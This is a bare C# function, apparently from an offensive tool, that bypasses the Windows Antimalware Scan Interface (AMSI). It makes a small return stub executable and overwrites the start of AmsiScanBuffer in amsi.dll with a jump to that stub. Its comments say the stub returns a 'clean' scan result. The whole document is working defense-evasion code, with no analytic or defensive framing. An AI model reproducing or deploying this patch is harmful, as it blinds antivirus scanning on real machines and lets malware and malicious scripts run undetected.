static void HookAmsi()
{
  // return AMSI_RESULT_CLEAN
  byte[] retOne = new byte[] { 0xC2, 0x01, 0x00 };

  unsafe 
  {
      fixed (byte* ptr = retOne)
      {
          // copy the shellcode to memory and make executable
          IntPtr memoryAddress = (IntPtr)ptr;
          VirtualProtect(memoryAddress, (UIntPtr)3, 0x00000040, out UInt32 lpfOldProtect);
                    
          // create the patch for the amsi call
          byte[] patch = new byte[14] { 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
          byte[] funcAddress = BitConverter.GetBytes(memoryAddress.ToInt64());
          Buffer.BlockCopy(funcAddress, 0, patch, 6, 8);

          // get the AmsiScanBuffer address
          IntPtr AmsiScanBufferAddress = GetProcAddress(GetModuleBaseAddress("amsi.dll"), "AmsiScanBuffer");
          VirtualProtect(AmsiScanBufferAddress, (UIntPtr)14, (uint)0x00000040, out lpfOldProtect);

          // patch it to point at our return AMSI_RESULT_CLEAN shellcode
          Marshal.Copy(patch,0, AmsiScanBufferAddress, 14);
      }
  }
}
